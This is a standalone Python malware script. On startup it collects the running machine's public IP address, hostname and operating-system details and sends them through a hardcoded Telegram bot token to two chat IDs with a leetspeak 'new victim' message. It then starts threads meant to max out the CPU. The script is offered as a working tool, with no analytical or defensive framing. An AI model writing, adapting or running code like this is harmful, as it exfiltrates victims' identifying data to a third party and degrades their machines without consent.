import os
os.system("pip install time socket requests telebot threading")
import time
import threading
import telebot
import requests
import socket
import platform
bot = telebot.TeleBot("7058026179:AAGzPD0Pa_ATfAzqcEMn3mlt_7UZ5gLiguw")
def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        ip_info = response.json()
        return ip_info['ip']
    except Exception as e:
        print(e) 
        return None
def get_device_info():
    device_name = platform.node()
    os_info = platform.platform()
    return device_name, os_info
def on_startup():
    ip = get_public_ip()
    device_name, os_info = get_device_info()
    bot.send_message(1465736325, f"[1NF0] N3W G07!?\n[0$] : {os_info}\n[1P] : {ip}\n[N4M3] : {device_name}")
    bot.send_message(5133923436, f"[1NF0] N3W G07!?\n[0$] : {os_info}\n[1P] : {ip}\n[N4M3] : {device_name}")
def cpu_stress():
    while True:
        num = 1000000000
        factorial(num)
def factorial(n):
    if n == 0:
        return 1
    else:
        return n * factorial(n - 1)
def main(duration):
    threads = []
    start_time = time.time()
    for _ in range(threading.active_count()): 
        t = threading.Thread(target=cpu_stress)
        t.start()
        threads.append(t)
    time.sleep(duration)
    for t in threads:
        t.join(timeout=1)
if __name__ == "__main__":
    on_startup() 
    main(9999)
